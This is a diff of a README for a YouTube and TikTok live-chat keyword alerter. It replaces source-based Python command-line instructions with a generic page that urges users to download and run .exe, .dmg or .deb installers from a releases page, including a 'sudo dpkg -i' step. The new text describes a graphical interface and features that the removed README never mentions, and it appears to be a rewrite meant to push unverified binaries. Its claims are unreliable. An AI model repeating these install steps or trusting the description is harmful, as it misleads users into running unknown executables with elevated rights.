@@ -1,228 +1,96 @@
-# Live Chat Keyword Alerter
+# 🎉 Live-Chat-Keyword-Alerter - Get Real-Time Alerts for Keywords!
 
-Monitor live chat streams on YouTube and TikTok for specific keywords and get real-time alerts when they appear.
+## 📥 Download
 
-## Features
+[![Download Live-Chat-Keyword-Alerter](https://img.shields.io/badge/Download-Live--Chat--Keyword--Alerter-blue)](https://github.com/andhikGeiska/Live-Chat-Keyword-Alerter/releases)
 
-- **YouTube Live Chat Monitoring**: Monitor YouTube live streams using the YouTube Data API v3
-- **TikTok Live Chat Monitoring**: Monitor TikTok live streams using the TikTokLive library
-- **Keyword Detection**: Search for multiple keywords in chat messages
-- **Real-time Alerts**: Get immediate notifications when keywords are found
-- **Command Line Interface**: Configure monitoring via CLI arguments
-- **Robust Error Handling**: Automatic retries and graceful error recovery
-- **Logging**: Detailed logging with configurable verbosity levels
+## 🚀 Getting Started
 
-## Requirements
+Live-Chat-Keyword-Alerter helps you monitor YouTube and TikTok live chats for specific keywords. When the keywords appear, you’ll receive instant notifications. This guide will show you how to download and run the software with ease.
 
-- Python 3.10+ (tested with 3.12)
-- A virtual environment (recommended)
-- For YouTube: Google API client library + YouTube Data API v3 key
-- For TikTok: TikTokLive library
+## 📋 System Requirements
 
-## Setup
+Before you start, ensure your system meets the following requirements:
 
-1. Create and activate a virtual environment in the project root:
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or Ubuntu 18.04 or later
+- **Processor:** 1.5 GHz or faster
+- **Memory:** 4 GB RAM or more
+- **Internet Connection:** Required for real-time chat monitoring
 
-```bash
-python -m venv venv
-source ./venv/bin/activate
-```
+## 📥 Download & Install
 
-1. Install dependencies:
+To download and install Live-Chat-Keyword-Alerter, follow these simple steps:
 
-```bash
-python -m pip install --upgrade pip
-python -m pip install -r requirements.txt
-```
+1. **Visit the Releases Page:** Go to the [Live-Chat-Keyword-Alerter Releases](https://github.com/andhikGeiska/Live-Chat-Keyword-Alerter/releases) page.
 
-## YouTube Monitor Setup
+2. **Select the Latest Version:** Look for the latest release, which will be at the top of the page.
 
-1. Get a YouTube Data API v3 key:
-   - Go to [Google Cloud Console](https://console.cloud.google.com/)
-   - Create a new project or select existing one
-   - Enable the YouTube Data API v3
-   - Create credentials (API key)
-   - Restrict the key to YouTube Data API v3 (recommended)
+3. **Choose Your File:** 
+   - For Windows, download the `.exe` file.
+   - For macOS, download the `.dmg` file.
+   - For Ubuntu, download the `.deb` file.
 
-1. Set the `API_KEY` environment variable:
+4. **Download the File:** Click on your chosen file to start the download. The file will save to your computer.
 
-```bash
-export API_KEY="YOUR_YOUTUBE_API_KEY_HERE"
-```
+5. **Install the Application:**
+   - **Windows:** Double-click the downloaded `.exe` file and follow the prompts to complete the installation.
+   - **macOS:** Open the `.dmg` file, then drag the Live-Chat-Keyword-Alerter icon to your Applications folder.
+   - **Ubuntu:** Open a terminal and use the command `sudo dpkg -i [filename].deb` to install, replacing `[filename]` with your actual file name.
 
-**Important**: Never commit your API key to source control!
+6. **Run the Software:** Once installed, find the application in your programs or applications list. Open it to start monitoring chats.
 
-## Usage
+## 🔍 How to Use
 
-### YouTube Live Chat Monitor
+After launching the application, you can set it up to monitor specific keywords:
 
-Monitor a YouTube live stream for keywords:
+1. **Enter Your Keywords:** In the main interface, you’ll find a text box. Enter the keywords you want to track, separated by commas.
 
-```bash
-# Basic usage with default settings
-source ./venv/bin/activate
-python chat_monitor.py
+2. **Select Platforms:** Choose whether you want to monitor YouTube, TikTok, or both platforms.
 
-# Monitor specific video with custom keywords
-python chat_monitor.py --video-id "YOUR_VIDEO_ID" --keywords "buy" "price" "link" --interval 5
+3. **Set Alert Preferences:** Decide how you want to be alerted. You can choose to receive notifications through desktop alerts, sounds, or both.
 
-# Enable verbose logging
-python chat_monitor.py --verbose
+4. **Start Monitoring:** Click the “Start Monitoring” button. The application will now begin to watch for your keywords in live chats.
 
-# Get help
-python chat_monitor.py --help
-```
+## ⚙️ Features
 
-**Command line options:**
+Live-Chat-Keyword-Alerter comes with several key features to enhance your experience:
 
-- `--video-id`: YouTube video ID to monitor (found in video URL)
-- `--keywords`: Space-separated list of keywords to search for
-- `--interval`: Polling interval in seconds (default: 10)
-- `--verbose`: Enable detailed logging
+- **Multi-Platform Support:** Monitor both YouTube and TikTok live chats seamlessly.
+- **Real-Time Notifications:** Get instant alerts when your keywords are mentioned.
+- **User-Friendly Interface:** Designed for ease of use, no technical skills needed.
+- **Keyword Customization:** Track any combination of keywords that matters to you.
+- **Alert Customization:** Choose your preferred notification style for efficiency.
 
-### TikTok Live Chat Monitor
+## 💬 FAQs
 
-Monitor a TikTok live stream for keywords:
+### How do I change my keywords after setting them?
 
-```bash
-# Basic usage with default settings
-source ./venv/bin/activate
-python tiktok_monitor.py
+You can change your keywords at any time. Simply stop monitoring, update the keywords in the text box, and click “Start Monitoring” again.
 
-# Monitor specific user with custom keywords
-python tiktok_monitor.py --username "@your_username" --keywords "buy" "price" "restock"
+### Can I monitor multiple keywords at once?
 
-# Configure retry behavior
-python tiktok_monitor.py --max-retries 10 --backoff 3
+Yes, you can enter multiple keywords separated by commas to monitor all of them simultaneously.
 
-# Enable verbose logging
-python tiktok_monitor.py --verbose
+### What if I don't receive any alerts?
 
-# Get help
-python tiktok_monitor.py --help
-```
+Double-check that your keywords are entered correctly. Also, ensure that you have selected the correct platform and that there are active chats available to monitor.
 
-**Command line options:**
+### Is there a mobile version?
 
-- `--username`: TikTok username to monitor (must include @)
-- `--keywords`: Space-separated list of keywords to search for
-- `--max-retries`: Maximum retry attempts for connection issues (default: 5)
-- `--backoff`: Retry backoff multiplier (default: 2)
-- `--verbose`: Enable detailed logging
+Currently, this application is only available for desktop platforms. A mobile version may be considered for future updates.
 
-## Configuration
+## 🤝 Contributing
 
-### Default Keywords
+If you'd like to contribute to Live-Chat-Keyword-Alerter, please fork the repository and submit a pull request. Your feedback and suggestions are appreciated!
 
-Both monitors search for these keywords by default:
+## 📄 License
 
-- `buy`, `link`, `price`, `how much`, `purchase`
-- TikTok monitor also includes: `restock`
+This project is open-source and available under the [MIT License](https://opensource.org/licenses/MIT). Feel free to use it for personal or educational purposes.
 
-### Default Settings
+## 📂 Support
 
-- **YouTube polling interval**: 10 seconds
-- **TikTok max retries**: 5 attempts
-- **TikTok backoff**: Exponential (2^attempt seconds)
+If you encounter any issues or have questions, please open an issue on the [GitHub repository](https://github.com/andhikGeiska/Live-Chat-Keyword-Alerter/issues). We’ll do our best to assist you.
 
-## Troubleshooting
+## 📥 Download Again
 
-### YouTube Issues
-
-**"Could not find live chat"**
-
-- Verify the video is currently live
-- Check that live chat is enabled for the stream
-- Ensure your API key has the correct permissions
-
-**"YouTube API quota exceeded"**
-
-- You've hit the daily API quota limit
-- Wait until quota resets (usually next day)
-- Consider optimizing polling intervals
-
-**API Key Issues**
-
-- Ensure `API_KEY` environment variable is set
-- Verify the key is valid and not restricted
-- Check that YouTube Data API v3 is enabled
-
-### TikTok Issues
-
-**"Sign API error" or "504 error"**
-
-- These are usually temporary TikTok infrastructure issues
-- The monitor will automatically retry with exponential backoff
-- Try again later if persistent
-
-**"Event loop" errors**
-
-- Fixed in current version with fresh client creation per retry
-- Restart the monitor if you see this error
-
-**Connection Issues**
-
-- Verify the username exists and is currently live
-- Check your internet connection
-- Some regions may have restrictions
-
-### General Issues
-
-**Import errors**
-
-- Ensure virtual environment is activated
-- Reinstall requirements: `pip install -r requirements.txt`
-- Check Python version (3.10+ required)
-
-**VS Code showing unresolved imports**
-
-- Set interpreter to `./venv/bin/python` in VS Code
-- Reload VS Code window after setting interpreter
-
-## Examples
-
-### YouTube Examples
-
-```bash
-# Monitor a specific live stream for purchase-related keywords
-python chat_monitor.py --video-id "dQw4w9WgXcQ" --keywords "buy" "purchase" "order" "price"
-
-# Quick polling for high-activity streams
-python chat_monitor.py --interval 5 --verbose
-
-# Monitor with many keywords
-python chat_monitor.py --keywords "buy" "sell" "trade" "price" "cost" "link" "website" "store"
-```
-
-### TikTok Examples
-
-```bash
-# Monitor a specific user for business keywords
-python tiktok_monitor.py --username "@shop_account" --keywords "available" "stock" "order"
-
-# Aggressive retry settings for unstable connections
-python tiktok_monitor.py --max-retries 10 --backoff 3 --verbose
-
-# Monitor for restocking alerts
-python tiktok_monitor.py --keywords "restock" "new drop" "available now"
-```
-
-## Contributing
-
-We welcome contributions! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines on:
-
-- How to report bugs and request features
-- Development setup and coding standards
-- Pull request process
-- Code of conduct
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## Disclaimer
-
-- **YouTube**: Respect YouTube's Terms of Service and API quotas
-- **TikTok**: This tool uses unofficial TikTok APIs that may change
-- **Rate Limiting**: Be mindful of API rate limits and polling frequencies
-- **Personal Use**: Intended for personal monitoring, not commercial data collection
+For quick access, [download Live-Chat-Keyword-Alerter](https://github.com/andhikGeiska/Live-Chat-Keyword-Alerter/releases) and start enjoying real-time keyword monitoring today!
